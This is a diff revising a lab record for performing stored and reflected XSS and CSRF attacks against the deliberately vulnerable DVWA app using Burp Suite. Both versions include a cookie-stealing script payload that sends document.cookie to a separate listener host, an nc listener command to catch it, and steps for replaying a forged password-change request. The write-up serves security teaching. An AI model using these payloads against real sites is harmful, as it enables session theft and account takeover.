@@ -1,188 +1,141 @@
-Experiment 5 — XSS & CSRF (Execution Chit)
-
+Experiment 5 — XSS & CSRF using DVWA
+and Burp Suite
 Aim
-To perform XSS and CSRF attack testing using DVWA and Burp Suite.
-
---------------------------------------------------
-
-i) XSS (Cross Site Scripting)
-
-Step 1: Start Machines
-- Start Kali Linux VM
-- Start Metasploitable2 VM
-
---------------------------------------------------
-
+To perform Cross Site Scripting (XSS) and Cross Site Request Forgery (CSRF) attacks using
+DVWA and Burp Suite.
+Theory
+Cross Site Scripting (XSS)
+Cross Site Scripting is a web security vulnerability in which malicious scripts are injected into web
+pages and executed on the client side. It allows attackers to steal cookies, session IDs, and perform
+malicious actions in a victim’s browser.
+Types of XSS
+1. Stored XSS
+The malicious script is permanently stored in the web application database.
+2. Reflected XSS
+The malicious script is reflected immediately from the server response.
+Cross Site Request Forgery (CSRF)
+CSRF is a web attack in which an attacker tricks an authenticated user into performing unwanted
+actions on a web application without their knowledge.
+Requirements
+• Kali Linux VM
+• Metasploitable2 VM
+• DVWA
+• Burp Suite
+• Firefox Browser
+Procedure
+Part A — XSS Attack
+Step 1: Start Virtual Machines
+• Start Kali Linux VM
+• Start Metasploitable2 VM
 Step 2: Open DVWA
-
-Browser:
-http://192.168.111.129
-
-Login:
+Open browser in Kali Linux.
+Enter:
+http://192.168.245.133/dvwa
+Login credentials:
 Username: admin
 Password: password
-
---------------------------------------------------
-
-XSS Stored
-
-Step 3: Navigate
-DVWA → XSS (Stored)
-
---------------------------------------------------
-
-Step 4: Normal Input
-
+Step 3: Set Security Level
+Navigate to:
+DVWA Security
+Set:
+Security Level → Low
+Click Submit.
+Stored XSS
+Step 4: Navigate to XSS Stored
+Go to:
+XSS (Stored)
+Step 5: Insert Normal Input
 Name:
 Test
-
 Message:
 <b>Hello Everyone</b>
-
 Click:
 Sign Guestbook
-
---------------------------------------------------
-
-Step 5: Inject XSS Script
-
+Observation:
+• Bold text is displayed.
+Step 6: Insert XSS Payload
 Name:
 Hi
-
 Message:
 <script>alert("Hello This is XSS")</script>
-
 Click:
 Sign Guestbook
-
 Observation:
-- Popup alert message appears.
-- Stored permanently in page.
-
---------------------------------------------------
-
-Step 6: Cookie Fetching
-
-Script:
+• Popup alert message appears.
+• Script remains stored permanently.
+Step 7: Cookie Fetching
+Message:
 <script>alert(document.cookie)</script>
-
 Observation:
-- Displays PHPSESSID cookie value.
-
---------------------------------------------------
-
-XSS Reflected
-
-Step 7:
-
-Navigate:
-DVWA → XSS (Reflected)
-
+• PHPSESSID cookie value is displayed.
+Reflected XSS
+Step 8: Navigate to XSS Reflected
+Go to:
+XSS (Reflected)
 Enter:
 <script>alert("hello")</script>
-
 Click Submit.
-
 Observation:
-- Alert popup displayed.
-- Popup disappears after page refresh.
-
---------------------------------------------------
-
-Cookie Stealing Demo
-
-Step 8:
-
-Enter below payload in XSS Stored message box:
-
-<script>new Image().src="http://192.168.62.128/abc.php?output="+document.cookie;</script>
-
---------------------------------------------------
-
-Step 9: Start Listener in Kali
-
+• Alert popup appears temporarily.
+• Script is not stored permanently.
+Cookie Stealing
+Step 9: Start Listener
+In Kali terminal:
 nc -lvp 80
-
+Step 10: Inject Cookie Stealing Payload
+Message:
+<script>new Image().src="http://192.168.245.128/abc.php?
+output="+document.cookie;</script>
 Observation:
-- Victim cookie captured in Kali terminal.
-
---------------------------------------------------
-
-ii) CSRF using Burp Suite
-
-Step 1:
-
-Login DVWA:
-admin/password
-
-Set Security:
-DVWA Security → Low
-
---------------------------------------------------
-
-Step 2: Launch Burp Suite
-- Open Burp Suite
-- Configure proxy
-- Import Burp certificate
-
---------------------------------------------------
-
-Step 3:
-
-Navigate:
-DVWA → CSRF
-
+• Victim cookies are captured in Kali terminal.
+Part B — CSRF Attack using Burp Suite
+Step 11: Launch Burp Suite
+Open:
+Burp Suite
+Select:
+Temporary Project
+Click:
+Start Burp
+Step 12: Configure Proxy
+Go to:
+Proxy → Intercept
+Enable:
+Intercept ON
+Configure Firefox proxy:
+HTTP Proxy: 127.0.0.1
+Port: 8080
+Step 13: Open CSRF Page
+In DVWA navigate to:
+CSRF
 Enter:
 New Password
 Confirm Password
-
---------------------------------------------------
-
-Step 4:
-
-Enable:
-Proxy → Intercept ON
-
+Step 14: Capture Request
 Click:
 Change
-
---------------------------------------------------
-
-Step 5:
-- Capture request
-- Send to Repeater
-- Forward request
-
+Burp Suite captures the HTTP request.
+Step 15: Send to Repeater
+Right click request and select:
+Send to Repeater
+Click:
+Forward
 Observation:
-- Password changed successfully.
-
---------------------------------------------------
-
-Step 6:
-
-Modify password in Repeater and resend request.
-
+• Password changes successfully.
+Step 16: Modify Request
+In Repeater tab:
+Change password values and click:
+Send
 Observation:
-- Password changes again without user knowledge.
-
---------------------------------------------------
-
-Step 7:
-
-Disable:
-Intercept OFF
-
-Logout and login again using old password.
-
-Observation:
-- Login fails because password changed.
-
---------------------------------------------------
-
+• Password changes without user knowledge.
+Observation
+• Stored XSS stores malicious scripts permanently.
+• Reflected XSS reflects scripts temporarily.
+• Cookies can be stolen using JavaScript payloads.
+• Burp Suite intercepts and modifies HTTP requests successfully.
+• CSRF attack changes user password without authorization.
 Result
-
 Successfully performed:
-- Stored XSS
-- Reflected XSS
-- Cookie stealing
-- CSRF attack using Burp Suite
+• Stored XSS Attack
+• Reflected XSS Attack
+• Cookie Stealing
+• CSRF Attack using Burp Suite
